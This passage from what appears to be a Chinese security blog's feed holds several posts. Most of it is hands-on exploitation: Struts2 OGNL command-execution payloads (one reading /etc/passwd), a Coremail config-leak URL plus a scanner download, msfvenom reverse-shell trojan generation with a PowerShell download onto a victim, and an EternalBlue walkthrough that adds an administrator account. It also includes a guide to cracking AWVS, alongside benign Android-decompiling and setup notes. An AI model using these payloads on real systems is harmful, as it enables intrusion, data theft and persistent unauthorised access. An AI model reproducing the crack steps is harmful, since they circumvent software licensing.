%{value}<br>进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value}<br>对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p></blockquote><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Struts 2.0.0 - Struts 2.0.8</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>环境打开<br>![在这里插入图片描述]<br>[图片上传失败…(image-5bcfcf-1563099334703)]<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMzMjE1My1jZWI3ZjBiOTEzMGYyNGNlLnBuZw" alt="image"></p><p>这个漏洞的问题在于可以直接输入和直接回显<br>将POC粘到一个输入框，点击Submit<br>此后会将数据提交到后端，后端检测值是否为空，然后返回，满足漏洞前提</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>获取tomcat执行路径：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;<span class="string">"tomcatBinDir&#123;"</span>+<span class="meta">@java</span>.lang.System<span class="meta">@getProperty</span>(<span class="string">"user.dir"</span>)+<span class="string">"&#125;"</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMzMjE1My0wOGRiYjU2OTg3NTk5N2ZkLnBuZw" alt="在这里插入图片描述"><br>获取Web路径：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMzMjE1My0xN2EyMDBlODNlOWQzOWIx" alt="在这里插入图片描述"><br>执行任意命令（命令参数：<code>pwd</code>）：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;"pwd"&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMzMjE1My0xOTJhZTdiZTM5NTQwODc1" alt="在这里插入图片描述"></p><p>命令要自己构造如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;cat&quot;,&quot;&#x2F;etc&#x2F;passwd&quot;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析利用 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Coremail-0day敏感文件泄露漏洞送附批量检测脚本</title>
      <link href="/2019/06/17/Coremail-0day%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E9%80%81%E9%99%84%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC/"/>
      <url>/2019/06/17/Coremail-0day%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E9%80%81%E9%99%84%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a><strong>漏洞介绍</strong></h2><p>Coremail邮件系统是业内唯一一款商用的超大规模运营级邮件系统，开始研发于1999年 [1] ，其前身为中国第一套中文电子邮件系统163\126，目前在中国的客户包括网易系列邮箱、中国移动手机邮箱(139)等国内领先的邮箱服务运营商，以及宝钢、首钢、南方电网、农业银行、交通银行、华润、神华、华能等世界500强中国企业，截止2019年，Coremail邮件系统产品在国内已拥有10亿终端用户 [2] ，已成为中国用户实际使用最广泛的电子邮件系统。</p><p>2019年5月22日，国家信息安全漏洞共享平台（CNVD）收录了由北京天融信网络安全技术有限公司报送的Coremail邮件系统信息泄露漏洞（CNVD-2019-16798）。<br>由于Coremail邮件系统的mailsms模块的参数大小写敏感存在缺陷，使得攻击者利用该漏洞，在未授权的情况下，通过远程访问URL地址获知Coremail服务器的系统配置文件，造成数据库连接参数等系统敏感配置信息泄露。</p><p>**<br>泄露页：<br><img src="https://img-blog.csdnimg.cn/20190617223418397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;mailsms&#x2F;s?func&#x3D;ADMIN:appState&amp;dumpConfig&#x3D;&#x2F;</span><br></pre></td></tr></table></figure><p>**<br>利用方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">域名&#x2F;IP等地址+POC</span><br></pre></td></tr></table></figure><p>即可获取目标邮件服务器配置文件<br>配置文件包括：文件路径、IP、端口、数据库用户、密码等敏感信息。</p><p>**<br><img src="https://img-blog.csdnimg.cn/2019061722321129.png" alt="在这里插入图片描述"><br>使用方法如下<br><img src="https://img-blog.csdnimg.cn/20190617223222864.png" alt="在这里插入图片描述"><br><strong>影响范围</strong><br>Coremail XT 3.0.1至XT 5.0.9版本，XT 5.0.9a及以上版本已修复该漏洞。</p><h2 id="批量测试脚本"><a href="#批量测试脚本" class="headerlink" title="批量测试脚本"></a><strong>批量测试脚本</strong></h2><p>自己写的简单脚本，大神勿喷，有意见我尽量改<br>**</p><h2 id="请勿用于非法扫描！"><a href="#请勿用于非法扫描！" class="headerlink" title="请勿用于非法扫描！"></a>请勿用于非法扫描！</h2><p>**<br>链接：<a href="https://pan.baidu.com/s/12N_2uJ4w7z_M3d-RZ8tN8Q" target="_blank" rel="noopener">https://pan.baidu.com/s/12N_2uJ4w7z_M3d-RZ8tN8Q</a><br>提取码：n0xx</p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析漏洞0daycoremail </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Android反编译(apktool、dex2jar、jd-gui）三件套教程</title>
      <link href="/2019/06/14/Android%E5%8F%8D%E7%BC%96%E8%AF%91(apktool%E3%80%81dex2jar%E3%80%81jd-gui%EF%BC%89%E4%B8%89%E4%BB%B6%E5%A5%97%E6%95%99%E7%A8%8B/"/>
      <url>/2019/06/14/Android%E5%8F%8D%E7%BC%96%E8%AF%91(apktool%E3%80%81dex2jar%E3%80%81jd-gui%EF%BC%89%E4%B8%89%E4%BB%B6%E5%A5%97%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="Android反编译-apktool、dex2jar、jd-gui）三件套教程"><a href="#Android反编译-apktool、dex2jar、jd-gui）三件套教程" class="headerlink" title="Android反编译(apktool、dex2jar、jd-gui）三件套教程"></a>Android反编译(apktool、dex2jar、jd-gui）三件套教程</h1><p>这个是网上流行的使用工具，我现在重新写一下屡一下思路</p><p><strong>apk反编译软件有个组合套餐：apktool 、dex2jar、jd-jui，</strong></p><p>我直接打包好了一套工具，也配置好了，使用可以直接用剩的再收集麻烦w<br>这个下载地址：<br><a href="https://download.csdn.net/download/god_zzz/11241989" target="_blank" rel="noopener">https://download.csdn.net/download/god_zzz/11241989</a></p><h2 id="简单介绍一下，大概了解一下各自是干什么的："><a href="#简单介绍一下，大概了解一下各自是干什么的：" class="headerlink" title="简单介绍一下，大概了解一下各自是干什么的："></a>简单介绍一下，大概了解一下各自是干什么的：</h2><p><strong>## apktool</strong></p><p>可以反编译软件的布局文件、xml文件、AndroidManifest.xml和图片等。</p><p><strong>## dex2jar</strong></p><p>将apk反编译成java源码，也就是说把classes.dex转化成jar文件，反编译源码</p><p><strong>## jd-gui</strong><br>源码文件转化成jar文件，这个打开直接查看jar的源码</p><p>**</p><h2 id="开始反编译"><a href="#开始反编译" class="headerlink" title="开始反编译"></a>开始反编译</h2><ul><li>第一步下载好工具和要测试的apk</li><li>然后使用</li><li></li></ul><h2 id="apktool使用注意"><a href="#apktool使用注意" class="headerlink" title="apktool使用注意"></a>apktool使用注意</h2><ul><li>要确保他们三个在一个文件夹里面，然后打开CMD命令把路径切到这里<br><img src="https://img-blog.csdnimg.cn/20190614213145709.png" alt="在这里插入图片描述"></li></ul><p>使用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d -f  ***.apk</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190614213908118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019061421401366.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190614214040881.png" alt="在这里插入图片描述"><br>里面就是所要的文件，第一部分结束</p><h2 id="第二部分–dex2jar反编译源文件"><a href="#第二部分–dex2jar反编译源文件" class="headerlink" title="第二部分–dex2jar反编译源文件"></a>第二部分–dex2jar反编译源文件</h2><ul><li></li><li>找到APK文件，直接右键解压</li><li>解压到新的文件夹，记得解压重新命名要不会覆盖（因为名字一样）</li><li>找到里面的文件 classes.dex</li><li><strong>classes.dex</strong>是我们要的文件</li><li></li><li><img src="https://img-blog.csdnimg.cn/20190614214529909.png" alt="在这里插入图片描述"></li><li></li><li><strong>第二步把classes.dex文件放到dex2jar解压好的文件夹里</strong></li><li></li></ul><p><img src="https://img-blog.csdnimg.cn/2019061421481150.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>##还是要注意 运行命令的实话路径一定要切换到当前路径</p><p>然后输入命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d2j-dex2jar.bat classes.dex</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190614215124837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样反编译就成功了</p><p>**</p><h2 id="最后一步用JD-GUI查看源码"><a href="#最后一步用JD-GUI查看源码" class="headerlink" title="最后一步用JD-GUI查看源码"></a>最后一步用JD-GUI查看源码</h2><p>**<br>**</p><ul><li>现在有了jar文件</li><li>直接双击打开JD-GUI</li><li>把jar文件直接拖进去就可以看了<br><img src="https://img-blog.csdnimg.cn/20190614215634222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>**</li></ul><p><strong>##这就是反编译的过程了</strong><br><strong>有一个提醒就行，用命令行有个问题如果生成的文件已经有了就会报错，不会提示你覆盖，所以运行之前最好检查不要有已经存在可能重名的</strong></p>]]></content>
      
      
      <categories>
          
          <category> app渗透Android反编译app渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux版awvs最新版v_190325161的安装记录</title>
      <link href="/2019/06/13/Linux%E7%89%88awvs%E6%9C%80%E6%96%B0%E7%89%88v_190325161%E7%9A%84%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/06/13/Linux%E7%89%88awvs%E6%9C%80%E6%96%B0%E7%89%88v_190325161%E7%9A%84%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>因为之前52的安装教程贴被删除了<br>所以我自己重新记录一下<br>方便以后的使用<br>也是自己用的环境 -—我用的是2019的ubantu和Xshell</p><p>下载地址<a href="https://download.csdn.net/download/god\_zzz/11238215" target="_blank" rel="noopener">https://download.csdn.net/download/god\_zzz/11238215</a><br>里面有三个：： 一个安装包一个破解文件一个安装说明</p><p>**</p><h2 id="下面开始安装"><a href="#下面开始安装" class="headerlink" title="下面开始安装"></a>下面开始安装</h2><p>**</p><ul><li>安装环境依赖（如果有问题先更新一下源）</li></ul><p><code>root@kali:~# sudo apt-get install libxdamage1 libgtk-3-0 libasound2 libnss3 libxss1 \-y</code></p><blockquote><p>正在读取软件包列表… 完成 正在分析软件包的依赖关系树 正在读取状态信息… 完成 libxss1<br>已经是最新版 (1:1.2.3-1)。 libxss1 已设置为手动安装。 将会同时安装下列软件： libasound2-data<br>libgtk-3-common libxdamage-dev 建议安装： alsa-utils 下列软件包将被升级：<br>libasound2 libasound2-data libgtk-3-0 libgtk-3-common libnss3<br>libxdamage-dev libxdamage1 升级了 7 个软件包，新安装了 0 个软件包，要卸载 0 个软件包，有 1115<br>个软件包未被升级。 … … …</p><p>正在处理用于 libc-bin (2.28-2) 的触发器 …</p></blockquote><p><strong>第二部传文件</strong></p><ul><li><strong>传文件</strong></li></ul><p>r<br>root@kali:/home# ls</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:&#x2F;home# rz                           我用的Xshell直接传</span><br><span class="line"></span><br><span class="line">root@kali:&#x2F;home# ls</span><br></pre></td></tr></table></figure><p>acunetix_trial.sh AWVS12-Linux.zip Linux_Awvs安装说明.txt patch_awvs</p><ul><li></li></ul><p><strong>&gt; 改文件的操作权限@@@@@@@@@</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:&#x2F;home# chmod u+x *</span><br><span class="line"></span><br><span class="line">root@kali:&#x2F;home# ls</span><br></pre></td></tr></table></figure><p>acunetix_trial.sh AWVS12-Linux.zip Linux_Awvs安装说明.txt patch_awvs（全绿可执行）</p><p><strong>- 安装开始</strong></p><ul><li><p>中间输入用户名密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:&#x2F;home# .&#x2F;acunetix_trial.sh</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>交互式输入用户信息:</p><ol><li>是否同意协议:yes</li><li>输入主机名:</li><li>输入管理员邮箱:xxx@xxx.com 就是用户名</li><li>输入密码:!Q2w3e4r</li></ol></blockquote><ul><li>安装结束后访问:<br><a href="https://ip:13443/" target="_blank" rel="noopener">https://ip:13443/</a> 当然kali你的IP地址<br><img src="https://img-blog.csdnimg.cn/20190612172401116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>安装pojie文件</li><li></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">##拷贝 patch_awvs 到后面得安装目录</span><br><span class="line">root@Nessus: cp patch_awvs &#x2F;home&#x2F;acunetix&#x2F;.acunetix_trial&#x2F;v_190325161&#x2F;scanner&#x2F;       </span><br><span class="line"></span><br><span class="line">## 找到安装目录里面去</span><br><span class="line">root@Nessus:cd &#x2F;home&#x2F;acunetix&#x2F;.acunetix_trial&#x2F;v_190325161&#x2F;scanner</span><br><span class="line"></span><br><span class="line">## 必须在里面运行</span><br><span class="line">root@Nessus:&#x2F;home&#x2F;acunetix&#x2F;.acunetix_trial&#x2F;v_190325161&#x2F;scanner# .&#x2F;patch_awvs</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190612185624234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>安装成功</p><p>检查是否成功:<br>登录系统后, 点击右上角的”Administrator-&gt;Profile-&gt;License”,可以看到99999就说明成功激活</p><p>修改不检查更新:<br>登录系统后,左下角Settings-&gt;ProductUpgrades,改为”Do not automaticaly check for update[Not Recommanded]“</p>]]></content>
      
      
      <categories>
          
          <category> 配环境AWVS破解Linux无限 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MSF木马的简单利用</title>
      <link href="/2019/06/06/MSF%E6%9C%A8%E9%A9%AC%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/"/>
      <url>/2019/06/06/MSF%E6%9C%A8%E9%A9%AC%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>刚刚试了下永恒之蓝，看到有人用木马，也补一下后面的其他<br>环境和那一片的一样</p><ol><li>msfvenom模块，首先生成.exe木马文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.77.0.109 lport&#x3D;4443f exe &gt;&#x2F;root&#x2F;1.exe</span><br></pre></td></tr></table></figure><p>1.exe 就是木马 要把这个用各种方法去受害机运行</p><p><img src="https://img-blog.csdnimg.cn/2019060616093520.png" alt="在这里插入图片描述"><br>2. 输入msfconsole进入metasploi<br>3. 进入监听模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br></pre></td></tr></table></figure><ol start="4"><li>设置payload反弹</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br></pre></td></tr></table></figure><ol start="5"><li>设置监听ip端口</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set lhost 10.77.0.109</span><br><span class="line">set lport 4443</span><br><span class="line">要与木马一致</span><br></pre></td></tr></table></figure><ol start="6"><li>运行<img src="https://img-blog.csdnimg.cn/20190606161629689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>kali这边就准备完了，等待上线</li></ol><h2 id="在目标主机运行-1-exe-木马"><a href="#在目标主机运行-1-exe-木马" class="headerlink" title="在目标主机运行 1.exe 木马"></a>在目标主机运行 1.exe 木马</h2><p>利用是之前的ms17010直接shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile( &#39;http:&#x2F;&#x2F;10.77.0.100&#x2F;1.exe&#39;,&#39;c:\1.exe&#39;)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190606164405347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上线成功</p><p>后续的。。再写</p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析MSF木马 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>试试MSF的ms17-010永恒之蓝漏洞利用</title>
      <link href="/2019/06/06/%E8%AF%95%E8%AF%95MSF%E7%9A%84ms17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
      <url>/2019/06/06/%E8%AF%95%E8%AF%95MSF%E7%9A%84ms17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="试验环境"><a href="#试验环境" class="headerlink" title="试验环境"></a>试验环境</h2><p>(内网地址)</p><ul><li>-win7（未打补丁开445） 10.77.0.128</li><li>kali 10.77.0.109</li></ul><h2 id="首先信息收集，探测"><a href="#首先信息收集，探测" class="headerlink" title="首先信息收集，探测"></a>首先信息收集，探测</h2><ul><li>nmap意思一下</li></ul><blockquote><p><code>- nmap \-sS \-P0 \-A \-v 10.77.0.100</code></p></blockquote><p><img src="https://img-blog.csdnimg.cn/20190606120817590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="开的445"></p><h2 id="扫描漏洞"><a href="#扫描漏洞" class="headerlink" title="扫描漏洞"></a>扫描漏洞</h2><ul><li>msfconsole 启动</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><ul><li>加载扫描exp</li></ul><blockquote><p><code>use auxiliary/scanner/smb/smb_ms17_010</code></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190606135637929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>设置目标ip</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 10.77.0.128</span><br></pre></td></tr></table></figure><ul><li>运行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190606140644531.png" alt="在这里插入图片描述">发现可以利用</p><hr><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>加载攻击模块</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br></pre></td></tr></table></figure><ul><li>设置参数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 10.77.0.128</span><br></pre></td></tr></table></figure><ul><li>运行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190606142202832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>运行成功 进去了</p><p>可以直接CMD命令<br><img src="https://img-blog.csdnimg.cn/20190606142721340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><p>权限很高<br>直接net user</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user 123 1234 &#x2F;add（用户名 密码）</span><br><span class="line">net localgroup administrators xxxx &#x2F;add （将用户设置为管理员权限）</span><br></pre></td></tr></table></figure><p>重新打开一个终端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop+IP</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190606144604550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析永恒之蓝MSFms17-010 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vmtools坑</title>
      <link href="/2019/06/04/vmtools%E5%9D%91/"/>
      <url>/2019/06/04/vmtools%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p><strong>ubantu</strong></p><hr><p>但是…第一步：sudo apt-get autoremove open-vm-tools就告诉我，我没安装open-vm-tools</p><p>所以…就直接把open-vm-tools装上吧…</p><p><code>sudo apt-get install open-vm-tools-desktop</code></p><hr><hr><h2 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h2><p>原来Kali2.0的官网早就有说明，官方自己开发了一个vmtools工具，好崩溃~~~~</p><p><code>apt-get install open-vm-tools-desktop fuse</code></p><hr>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Centos7 安装uwsgi失败</title>
      <link href="/2019/05/13/Centos7%20%E5%AE%89%E8%A3%85uwsgi%E5%A4%B1%E8%B4%A5/"/>
      <url>/2019/05/13/Centos7%20%E5%AE%89%E8%A3%85uwsgi%E5%A4%B1%E8%B4%A5/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>centos7 安装uwsgi失败</p><h2 id="失败过程"><a href="#失败过程" class="headerlink" title="失败过程"></a>失败过程</h2><p>我是Centos 直接安装没有其他操作</p><p>按照网上部署部署uwsgi+nginx+django 教程</p><p>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</p><p>安装Python包管理<br>easy_install 包 <a href="https://pypi.python.org/pypi/distribute" target="_blank" rel="noopener">https://pypi.python.org/pypi/distribute</a></p><p>安装步骤:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; cd ~ wget</span><br><span class="line">&gt; https:&#x2F;&#x2F;pypi.python.org&#x2F;packages&#x2F;source&#x2F;d&#x2F;distribute&#x2F;distribute-0.6.49.tar.gz</span><br><span class="line">&gt; tar xf distribute-0.6.49.tar.gz cd distribute-0.6.49 python2.7</span><br><span class="line">&gt; setup.py install easy_install --version pip 包:</span><br><span class="line">&gt; https:&#x2F;&#x2F;pypi.python.org&#x2F;pypi&#x2F;pip</span><br></pre></td></tr></table></figure><p>发现没有自带没有安装 pip yum了pip<br>之后<br>使用pip安装<br>pip install uwsgi<br>报错一直没有解决<br>错误代码<br>ERROR: Command “/usr/bin/python2 -u -c ‘import setuptools, tokenize;<strong>file</strong>=’”’”’/tmp/pip-install-WeDbCr/uwsgi/setup.py’”’”’;f=getattr(tokenize, ‘“’”‘open’”’”’, open)(<strong>file</strong>);code=f.read().replace(’”’”’\r\n’”’”’, ‘“’”’\n’”’”’);f.close();exec(compile(code, <strong>file</strong>, ‘“’”‘exec’”’”’))’ install --record /tmp/pip-record-ySrxMo/install-record.txt --single-version-externally-managed --compile” failed with error code 1 in /tmp/pip-install-WeDbCr/uwsgi/</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><ol><li>使用python3 安装uwsgi</li><li>在centos自带的Python2下 必须同时安装“编译工具”和“python-devel”</li></ol><p>第二种方法代码<br>三步<br>1安装编译工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y gcc* pcre-devel openssl-devel</span><br></pre></td></tr></table></figure><p>正确截图<img 